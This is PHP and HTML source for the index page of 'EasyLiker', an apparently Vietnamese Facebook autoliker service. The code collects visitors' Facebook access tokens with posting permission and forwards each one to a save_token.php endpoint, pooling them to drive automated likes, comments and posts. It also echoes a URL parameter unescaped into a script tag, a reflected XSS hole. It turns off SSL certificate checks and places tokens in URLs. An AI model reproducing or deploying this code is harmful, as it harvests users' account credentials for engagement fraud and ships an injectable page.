<?php
session_start();
error_reporting(7);
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Token hết hạn vui lòng làm mới token..! !');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://localhost/like/save_token.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=Vui lòng chấp nhận ứng dụng, Thử Lại..');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=Đăng xuất thành công..!!');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("Thông Báo:  ' . $_GET['i'] . '");</script>';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Easyliker Autolike | Facebook Autoliker, Commenter, Follower, Posters.</title>
    <link rel="shortcut icon" href="img/favicon.png" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Easyliker là ứng dụng AutoLike đáng tin cậy nhất trên thế giới. Nó được phát hành dưới chứng chỉ của facebook! EasyLiker là ứng dụng autolike tốt nhất.">
<meta name="keywords" content="Easyliker Facebook Autoliker, New Facebook Autolike, Facebook Autolike 2015, Mobile Autolike, Top 5 Facebook Autolikers">
<meta name="author" content="MinhHung-It.Net">
<meta property="og:image" content="./img/slider/robot3.png" />

<!-- Google Fonts -->
<link href='https://fonts.googleapis.com/css?family=Lato:400,700,300' rel='stylesheet' type='text/css'>
<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/font-awesome.css" rel="stylesheet">
<link href="css/theme.css" rel="stylesheet">
<link rel="stylesheet" href="styleswitcher/css/styleswitcher.css">
<link id="colours" rel="stylesheet" href="css/colour.css" />
<link href="css/prettyPhoto.css" rel="stylesheet" type="text/css"/>
<link href="css/zocial.css" rel="stylesheet" type="text/css"/>
<!-- SLIDER REVOLUTION 4.x CSS SETTINGS -->
<link rel="stylesheet" type="text/css" href="rs-plugin/css/settings.css" media="screen" />
<link rel="stylesheet" href="assets/stylesheets/arthreff.css">
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-NC93NV"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-NC93NV');</script>
<!-- End Google Tag Manager -->

</head>
<body>

<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#controller").hide();
$( "#finish" ).show();
});
});
</script>
<center>
<div id="finish"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="load.gif"></center>
Giving Likes To Your Post ID! <Br>Meanwhile Please <b style="color: red;">BE ONLINE ON EASYLIKER</b>
</div>
</div></center>
<!--header-->
	<div class="header">
<!--menu-->
    <nav id="main_menu" class="navbar" role="navigation">
      <div class="container">
            <div class="navbar-header">
        <!--toggle-->
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#menu">
				<i class="fa fa-bars"></i>
			</button>
		<!--logo-->
			<div class="logo">
				<a href="./index.php"><img src="img/logo.png" alt="" class="animated bounceInDown" /></a> 
			</div>
		</div>
           
            <div class="collapse navbar-collapse" id="menu">
                <ul class="nav navbar-nav pull-right">
                   			<li class="dropdown active"><a href="./index.php">Trang Chủ</a></li>
							<li class="dropdown"><a href="javascript:{}">Liên Kết</a>
						<ul class="dropdown-menu">
								<li><a href="http://www.minhhung-it.net" target="_blank">MinhHung Blog</a></li>
								<li><a href="http://www.facebook.com/hung.nguyenhoangminh1412" target="_blank">Facebook</a></li>
						</ul>
							</li>
							<li><a href="about.php" target="_blank">Thông Tin</a></li>
							<li><a href="contact.php" target="_blank">Liên Hệ</a></li>
							<li><a href="https://www.youtube.com/watch?v=9dkLdqvW8qY" target="_blank">Hướng Dẫn</a></li>
						</ul>
					</div>
				</div>
			</nav>
		</div>
	<!--//header-->
	
	<!--page-->
		<!-- REVOLUTION SLIDER -->
        <div class="tp-banner-container">
		<div class="tp-banner">
		<ul>
		<!-- Slide 1 -->
			<li data-transition="slideright">
				<img src="img/slider/slider1.jpg" alt="" />
				
				<!-- Caption -->
				<div class="tp-caption lfr" data-x="left" data-y="220" data-speed="2400" data-start="800" data-easing="easeOutExpo">
					<img src="img/slider/robot3.png" alt="" />
				</div>
					
				<!-- Caption -->
				<div class="tp-caption lfb" data-x="870" data-y="150" data-speed="1400" data-start="1800" data-easing="easeOutExpo">
					<img src="img/slider/rocket.png" alt="" />
				</div>
				
				<!-- Caption -->
				<div class="tp-caption lfb" data-x="825" data-y="340" data-speed="1500" data-start="1900" data-easing="easeOutExpo">
					<img src="img/slider/flames.png" alt="" />
				</div>
				
				<!-- Caption -->	
				<div class="caption sft stl" data-x="center" data-y="150" data-speed="1000" data-start="700" data-easing="easeOutExpo">
					<h3 class="rev-title bold">Easy Liker</h3>
				</div>
				
				<!-- Caption -->
				<div class="caption lfl stl rev-title-sub" data-x="center" data-y="260" data-speed="800" data-start="1100" data-easing="easeOutExpo">
					The Most Trusted Autoliker!
				</div>
				
				<!-- Caption -->
				<div class="caption sfb" data-x="center" data-y="350" data-speed="1100" data-start="1500" data-easing="easeOutExpo">               
				</div>
			</li>
			<!-- Slide 2 -->
				<li data-transition="slideleft">
				<img src="img/slider/slider2.jpg" alt="" />
				
				<!-- Caption -->
				<div class="tp-caption lfl" data-x="right" data-y="55" data-speed="1000" data-start="800" data-easing="easeOutExpo">
					<img src="img/slider/iMac2.png" alt="" />
				</div>
					
				<!-- Caption -->
				<div class="caption lfl stl bg" data-x="20" data-y="60" data-speed="800" data-start="700" data-easing="easeOutExpo">
					<h2 class="rev-title big white">Welcome!!<br>EASYLIKER</h2>
				</div>
					
				<!-- Caption -->
				<div class="caption lfl stl rev-text rev-left" data-x="left" data-y="210" data-speed="800" data-start="1100" data-easing="easeOutExpo">
					<p class="hidden-xs">Hệ thống AutoLike thông minh,<br />
					Được phát triển trên chứng chỉ của Facebook
					</p>
				</div>
					
				<!-- Caption -->
				<div class="caption sfb stb rev-left" data-x="left" data-y="430" data-speed="1100" data-start="1500" data-easing="easeOutExpo">
					<a href="https://www.minhhung-it.net" class="btn btn-outline btn-mobile2 marg-right5">MinhHung Blog</a>
					<a href="contact.php" class="btn btn-outline btn-mobile2">CONTACT</a>                     
				</div>
			</li>
			</ul>
			<div class="tp-bannertimer tp-bottom"></div>
            </div>
        </div>
        <!-- // END REVOLUTION SLIDER -->

				<center>
	
</center>
	<div class="container wrapper">
	<div class="inner_content">
	<div class="tile">
	<h1><strong><center>
	
		<?php if ($token){echo "";}
		
		else{
		
		?>
		
		</center></strong></h1>	
		
<center>
<div class="alert alert-info">
      <h3><strong>Chào <font color="red">Khách</font>! Làm theo các bước dưới đây để đăng nhập vào EasyLiker.</strong></h3>
    </div>
	<h2>
<b><a class="btn btn-medium btn-danger" href="token.php" target="_blank"> <i class="fa fa-refresh fa-lg fa-spin"></i> Click Here</a> Vào Token panel để lấy token đăng nhập!</br></b>
</h2><h3>
Cài đặt theo dõi
					<a rel="nofollow" href="https://www.facebook.com/settings?tab=subscribers" target="_blank"><b>Facebook Followers [Settings]</b></a></h3><h2>
<br>
</center>		
		<?php
		}
		?><?php if ($token): ?>
	

<center>
<div class="alert alert-success">
<button type="button" class="close" data-dismiss="alert">×</button>
      <h3><strong> Đăng Nhập Thành Công Tại EasyLiker.</strong></h3>
    </div>
<img src="https://graph.facebook.com/me/picture?width=100&height=100&access_token=<?php echo $token;?>" alt="Easyliker Heartly Welcomes You!" style="height:100px;width:100px;border: 1px solid black;" class="trans" />
<br>	
<?php echo"".$user->name;?> <form method="post" action="">
<button type="submit" name="logout" style="width: 130px;" class="btn btn-danger">
                 Đăng Xuất <i class="fa fa-sign-out  fa-lg"></i>
            </button>	</form>	
<hr>
<b>Please select one service<b> <span class="color">below!</span></b><br>
<img src="./img/down.gif" alt="Mountain View">
<br>
<a href="liker.php" class="btn btn-info">AutoLike</a>
<a href="comment.php" class="btn btn-warning">Auto Comment</a>
<a href="pageliker.php" class="btn btn-danger">Page Liker</a>
<br>
<font size="4" color="green">Auto Post To Your Groups, Friends And Pages</font>
<br>
<a href="./autopost/post_groups.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Groups</a>
<a href="./autopost/post_pages.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Pages</a>
<a href="./autopost/post_friends.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Friends Timeline</a>
	
</center>
<hr>				
<?php else: ?>
<center>  <form action="verify.php" method="GET" onsubmit="CheckToken()">
					
					<input type="text" name="user"" value=""  style="width: 70%;" class="form-control" placeholder="https://www.facebook.com/connect/login_success.html#access_token=CAAAACZAVC6ygBANIFWLujYKjv6pOYJX6KNOsAlJ2lvmz7RZClKTO83pYwFRAjwNYVZBi&expires_in=0"
		 id="accesstoken"			autocomplete="off">
					 
					<button type="submit" style="width: 130px;" class="btn btn-success">
                <i class="fa fa-sign-in  fa-lg"></i> Đăng Nhập
            </button>
				</form>	</h2><br><br>	<center>
			
</center>	<?php endif ?>	</center>	<center>
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="loading.gif"></center>
EasyLiker Is Verifying Your Token! <Br>Mean while <b style="color: red;">Please Wait...</b>
</div>
</div></div></center>
	
		</div>
		<!--//page-->
	</div>	
	
	<!-- footer 2 -->
	<div id="footer2">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
				<div class="copyright">
							EASYLIKER
							&copy;
							<script type="text/javascript">
							//<![CDATA[
								var d = new Date()
								document.write(d.getFullYear())
								//]]>
								</script>
							 - All Rights Reserved :
							Designed by <a href="http://www.minhhung-it.net">MinhHung-Blog</a>
						</div>
						</div>
					</div>
				</div>
					</div>
				
<!-- SCRIPTS -->
<script src="js/jquery.js"></script>			
<script src="js/bootstrap.min.js"></script>	
<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.tools.min.js"></script>   
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
<!-- slider settings -->
<script type="text/javascript">
	//<![CDATA[
			jQuery(document).ready(function() {
					jQuery('.tp-banner').show().revolution(
				{
					delay:9000,
					startwidth:1170,
					startheight:600,
					navigationType:"bullet",
					navigationStyle:"square",
					hideBulletsOnMobile:"on",
					hideArrowsOnMobile: "on",
					shadow:0,
					fullWidth:"on",
				});
			});	
		//]]>
	</script>
<script type="text/javascript">

//<![CDATA[
   	window.fbAsyncInit = function() {
		FB.init({ appId: '171342606239806', 
			status: true, 
			cookie: true,
			xfbml: true,
			oauth: true
		});
   		    
	  		  	function updateButton(response) {
	    	var button = document.getElementById('fb-auth');
		
			if(button) {	
	    		if (response.authResponse) {
	      		// user is already logged in and connected
				button.onclick = function() {
					if($('login-form')){
						$('modlgn-username').set('value','Facebook');
						$('modlgn-passwd').set('value','Facebook');
						$('login-form').submit();
					} else if($('com-login-form')) {
					   $('username').set('value','Facebook');
					   $('password').set('value','Facebook');
					   $('com-login-form').submit();
					}
				}
			} else {
	      		//user is not connected to your app or logged out
	      		button.onclick = function() {
					FB.login(function(response) {
					   if (response.authResponse) {
					      if($('login-form')){
					      	$('modlgn-username').set('value','Facebook');
					      	$('modlgn-passwd').set('value','Facebook');
					      	$('login-form').submit();
					      } else if($('com-login-form')) {
					         $('username').set('value','Facebook');
					         $('password').set('value','Facebook');
					         $('com-login-form').submit();
					      }
					  } else {
					    //user cancelled login or did not grant authorization
					  }
					}, {scope:'email'});  	
	      		}
	    	}
	    }
	  }
	  // run once with current status and whenever the status changes
	  FB.getLoginStatus(updateButton);
	  FB.Event.subscribe('auth.statusChange', updateButton);	
	  	};
    //      
   window.addEvent('load', function(){
        (function(){
                if(!document.getElementById('fb-root')) {
                     var root = document.createElement('div');
                     root.id = 'fb-root';
                     document.getElementById('gkfb-root').appendChild(root);
                     var e = document.createElement('script');
                 e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
                     e.async = true;
                 document.getElementById('fb-root').appendChild(e);   
                }
        }());
    }); 
    //]]>
</script>
<script src="js/jquery.touchSwipe.min.js"></script>
<script src="js/jquery.mousewheel.min.js"></script>				
<script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
<script type="text/javascript" src="js/scripts.js"></script>
<script src="js/retina.js"></script>
<!-- carousel -->
<script type="text/javascript" src="js/jquery.carouFredSel-6.2.1-packed.js"></script>
<script type="text/javascript">
//<![CDATA[
jQuery(document).ready(function($) {
	$("#slider_home").carouFredSel({ 
		width : "100%", 
		height : "auto",
		responsive : true,
		auto : false,
		items : { width : 280, visible: { min: 1, max: 3 }
		},
		swipe : { onTouch : true, onMouse : true },
		scroll: { items: 1, },
		prev : { button : "#sl-prev", key : "left"},
		next : { button : "#sl-next", key : "right" }
		});
	});
//]]>
</script>
<script src="styleswitcher/js/styleswitcher.js"></script>
<script src="assets/javascripts/socialShare.min.js"></script>
<script src="assets/javascripts/socialProfiles.js"></script>





</body>
</html>
